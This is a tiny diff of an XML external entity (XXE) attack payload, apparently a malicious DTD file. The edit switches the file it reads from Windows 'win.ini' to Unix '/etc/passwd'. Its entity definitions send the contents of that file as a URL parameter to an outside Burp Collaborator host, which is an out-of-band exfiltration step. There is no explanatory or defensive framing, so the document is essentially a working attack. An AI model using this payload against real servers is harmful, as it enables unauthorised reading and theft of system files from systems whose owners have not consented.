@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c://windows/win.ini">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval SYSTEM "http://hn8t3oulcw8weo2maro0xu4rmisjg8.burpcollaborator.net/?x=%file;">
 %eval;
 %exfil;
